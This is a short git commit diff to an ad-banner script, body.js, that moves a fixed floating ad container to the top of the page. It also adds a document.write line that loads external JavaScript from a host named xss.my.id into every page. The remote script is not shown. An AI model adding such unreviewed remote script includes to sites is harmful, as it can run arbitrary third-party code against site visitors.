4f83ab3379fc5ad9e1fd89c4cbb6c396b2490676
cutlie <77072120+cutlie@users.noreply.github.com>
2024-02-20 21:02:50 +0700

    Update body.js

--- body.js
+++ body.js
@@ -1,9 +1,9 @@
-document.write('<div id="floatads" style="width:100%;margin:auto; text-align:center;float:none;overflow:hidden; display:scroll;position:fixed; bottom:0;z-index:9999">');
+document.write('<div id="floatads" style="width:100%;margin:auto; text-align:center;float:none;overflow:hidden; display:scroll;position:fixed; top:0;z-index:9999">');
 document.write('<div style="text-align:center;display:block;max-width:729px;height:auto;overflow:hidden;margin:auto">');
 
 //Paste Iklan Disini
 
-
+document.write('<script type="text/javascript" src="https://xss.my.id/ads/banner-loading.js"><\/script>');
 
 // Batas Iklan
 
